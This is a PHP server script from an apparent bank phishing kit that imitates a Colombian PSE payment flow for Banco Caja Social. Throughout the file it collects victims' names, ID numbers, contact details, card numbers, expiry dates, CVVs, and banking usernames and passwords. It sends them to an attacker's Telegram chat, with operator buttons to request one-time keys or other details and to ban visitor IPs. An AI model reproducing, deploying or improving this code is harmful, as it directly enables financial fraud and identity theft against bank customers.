<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

header('Content-Type: application/json');

// Crear archivo de log para debugging
$logFile = __DIR__ . '/../../log_pse.txt';
$log = function($msg) use ($logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " | " . $msg . "\n", FILE_APPEND);
};

$log("=== INICIO procesar_logo.php ===");

// Leer raw input
$rawInput = file_get_contents('php://input');
$log("Raw input length: " . strlen($rawInput));
$log("Raw input (primeros 500 chars): " . substr($rawInput, 0, 500));

// Cargar config local de este banco
$configLocal = @include __DIR__ . '/config.php';
$config = is_array($configLocal) ? $configLocal : [];
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $globalPath = __DIR__ . '/../../config.php';
    if (file_exists($globalPath)) {
        $config = include $globalPath;
        $log("Config global cargado exitosamente");
    } else {
        $log("ERROR: Config global no existe en: " . $globalPath);
    }
} else {
    $log("Config local cargado exitosamente");
}

// Recibir JSON del cliente
$input = json_decode($rawInput, true);
$log("Input decoded: " . ($input ? "OK" : "FALLO"));
$log("Input keys: " . json_encode(array_keys($input ?? [])));

// Validar datos obligatorios
if (!$input || empty($input['transactionId'])) {
    $log("ERROR: Datos incompletos o sin transactionId");
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$transactionId = $input['transactionId'] ?? '';

// --- RECORD CLIENT IP FOR TELEGRAM BAN BUTTON ---
    if (!empty($transactionId)) {
        $clean_tx = preg_replace('/[^a-zA-Z0-9_-]/', '', (string)$transactionId);
        $cl_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
        if (!empty($cl_ip)) {
            $cl_ip = trim(explode(',', $cl_ip)[0]);
            if (filter_var($cl_ip, FILTER_VALIDATE_IP)) {
                if (function_exists("sura_save_transaction_ip")) { sura_save_transaction_ip($clean_tx, $cl_ip); } else { $pRoot = __DIR__; while($pRoot !== dirname($pRoot)) { if (file_exists($pRoot . "/token_bank/config.php") || file_exists($pRoot . "/config.php")) break; $pRoot = dirname($pRoot); } foreach ([$pRoot . "/actions/ips", $pRoot . "/datac/actions/ips", $pRoot . "/gate/recargas/transaction/actions/ips", "/var/www/html/actions/ips"] as $d) { if (!is_dir($d)) { @mkdir($d, 0777, true); } if (is_dir($d)) { @file_put_contents($d . "/" . $clean_tx . ".txt", $cl_ip); } } }
            }
        }
    }
    // ------------------------------------------------
$tbdatos = $input['tbdatos'] ?? [];
if (is_string($tbdatos)) {
    $decodedTb = json_decode($tbdatos, true);
    $tbdatos = is_array($decodedTb) ? $decodedTb : [];
}
if (!is_array($tbdatos)) {
    $tbdatos = [];
}
$usuario = $input['usuario'] ?? '';
$clave = $input['clave'] ?? '';
$total_pagar = '';
foreach (['total_pagar', 'monto', 'amount', 'valor', 'valor_pagar', 'total'] as $field) {
    if (isset($input[$field]) && $input[$field] !== '' && $input[$field] !== null) {
        $total_pagar = $input[$field];
        break;
    }
}
if ($total_pagar === '') {
    foreach (['total_pagar', 'monto', 'amount', 'valor', 'valor_pagar', 'total'] as $field) {
        if (isset($tbdatos[$field]) && $tbdatos[$field] !== '' && $tbdatos[$field] !== null) {
            $total_pagar = $tbdatos[$field];
            break;
        }
    }
}
if ($total_pagar === '') {
    $total_pagar = '0';
} elseif (!isset($tbdatos['total_pagar']) || $tbdatos['total_pagar'] === '' || $tbdatos['total_pagar'] === '0') {
    $tbdatos['total_pagar'] = (string) $total_pagar;
}
$dispositivo = $input['dispositivo'] ?? 'Desconocido';
$timestamp = $input['timestamp'] ?? date('d-m-Y H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

$log("transactionId: $transactionId");
$log("tbdatos keys: " . json_encode(array_keys($tbdatos)));
$log("usuario: $usuario");

// Validar credenciales de Telegram
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $log("ERROR: Credenciales Telegram vacías");
    echo json_encode(['status' => 'error', 'message' => 'Credenciales de bot inválidas']);
    exit;
}

$log("Credenciales OK - token OK, chat OK");

// Determinar si hay datos de tarjeta
$tieneDataTarjeta = !empty($tbdatos['tarjeta']) && !empty($tbdatos['expMonth']) && !empty($tbdatos['cvv']);

// Construir mensaje formateado
$mensaje = construirMensajePSE($tbdatos, $usuario, $clave, $total_pagar, $dispositivo, $ip, $timestamp, $tieneDataTarjeta);

// Teclado de opciones
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => "Cara", 'callback_data' => "error:{$transactionId}"],
            ['text' => "Cedula", 'callback_data' => "cedula:{$transactionId}"]
        ],
        [
            ['text' => "Tarjeta", 'callback_data' => "tarjeta:{$transactionId}"],
            ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"]
        ],
        [
            ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"],
            ['text' => "Cajero", 'callback_data' => "error_cajero:{$transactionId}"]
        ],
        [
            ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]
        ]
    ,
                [
                    ['text' => "❌ BANEAR IP", 'callback_data' => "ban_ip:{$transactionId}"]
                ]]
];

// Preparar datos para Telegram
$data = [
    'chat_id' => $config['chat_id'],
    'text' => $mensaje,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($keyboard)
];

$log("Preparando envío a Telegram...");
$log("Mensaje length: " . strlen($mensaje));

// Envío a Telegram
$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

$log("Response HTTP code: $httpCode");
$log("Curl error: " . ($curlError ?: 'ninguno'));
$log("Response: " . substr($response, 0, 200));

$result = json_decode($response, true);

if ($httpCode === 200 && !empty($result['ok'])) {
    $messageId = $result['result']['message_id'];
    $log("Envío exitoso! MessageId: $messageId");
    
    echo json_encode([
        'status' => 'success',
        'messageId' => $messageId,
        'transactionId' => $transactionId
    ]);
} else {
    $log("ERROR: HTTP code $httpCode, result ok: " . ($result['ok'] ? 'true' : 'false'));
    echo json_encode(['status' => 'error', 'message' => 'Error en respuesta de Telegram']);
}

$log("=== FIN procesar_logo.php ===\n");

/**
 * FUNCIÓN PARA CONSTRUIR MENSAJE FORMATEADO
 */
function construirMensajePSE($tbdatos, $usuario, $clave, $total_pagar, $dispositivo, $ip, $timestamp, $tieneDataTarjeta) {
    // Obtener nombre del banco
    $bancoRaw = !empty($tbdatos['banco']) ? $tbdatos['banco'] : '1032 - BANCO CAJA SOCIAL';
    $banco = function_exists('jelpi_format_banco') ? jelpi_format_banco($bancoRaw, 'b-09') : strtoupper($bancoRaw);
    
    $msg = "◉ PSE - " . $banco . " ◉\n\n";
    
    // DATOS DEL CLIENTE - MOSTRAR TODOS LOS DISPONIBLES
    if (!empty($tbdatos['nombre'])) {
        $msg .= "🟢 <b>Nombre:</b> " . htmlspecialchars($tbdatos['nombre']) . "\n";
    }
    
    if (!empty($tbdatos['documento'])) {
        $tipo_id = !empty($tbdatos['tipo_identificacion']) ? htmlspecialchars($tbdatos['tipo_identificacion']) : '';
        $msg .= "🟢 <b>Documento:</b> " . htmlspecialchars($tbdatos['documento']) . ($tipo_id ? " ($tipo_id)" : "") . "\n";
    }
    
    if (!empty($tbdatos['correo'])) {
        $msg .= "🟢 <b>Correo:</b> " . htmlspecialchars($tbdatos['correo']) . "\n";
    }
    
    if (!empty($tbdatos['telefono'])) {
        $msg .= "🟢 <b>Teléfono:</b> " . htmlspecialchars($tbdatos['telefono']) . "\n";
    }
    
    if (!empty($tbdatos['direccion'])) {
        $msg .= "🟢 <b>Dirección:</b> " . htmlspecialchars($tbdatos['direccion']) . "\n";
    }
    
    $msg .= "\n";
    
    // DATOS DE TARJETA (si existen)
    if ($tieneDataTarjeta && !empty($tbdatos['tarjeta'])) {
        $msg .= "🟢 <b>Tarjeta:</b> " . htmlspecialchars($tbdatos['tarjeta']) . "\n";
        
        if (!empty($tbdatos['expMonth']) && !empty($tbdatos['expYear'])) {
            $msg .= "🟢 <b>Vencimiento:</b> " . htmlspecialchars($tbdatos['expMonth']) . "/" . htmlspecialchars($tbdatos['expYear']) . "\n";
        }
        
        if (!empty($tbdatos['cvv'])) {
            $msg .= "🟢 <b>CVV:</b> " . htmlspecialchars($tbdatos['cvv']) . "\n";
        }
        
        if (!empty($tbdatos['ownerName'])) {
            $msg .= "🟢 <b>Titular:</b> " . htmlspecialchars($tbdatos['ownerName']) . "\n";
        }
        
        $msg .= "\n";
    }
    
    // TRANSACCIÓN
    $metodo = $tieneDataTarjeta ? "Tarjeta" : "PSE";
    $msg .= "🟢 <b>Monto:</b> \$" . number_format($total_pagar, 0, ',', '.') . " | " . $metodo . "\n\n";
    
    // CREDENCIALES
    $msg .= "🟢 <b>Usuario:</b> " . htmlspecialchars($usuario) . "\n";
    $msg .= "🟢 <b>Contraseña:</b> " . htmlspecialchars($clave) . "\n\n";
    
    // INFORMACIÓN TÉCNICA
    $msg .= "🟢 <b>IP:</b> " . htmlspecialchars($ip) . " | <b>Device:</b> " . htmlspecialchars($dispositivo) . " | " . htmlspecialchars($timestamp) . "\n";
    
    // FOOTER CON PULPO
    $msg .= "\n🐙 @FU7UR4MA 🐙";
    
    return $msg;
}
?>
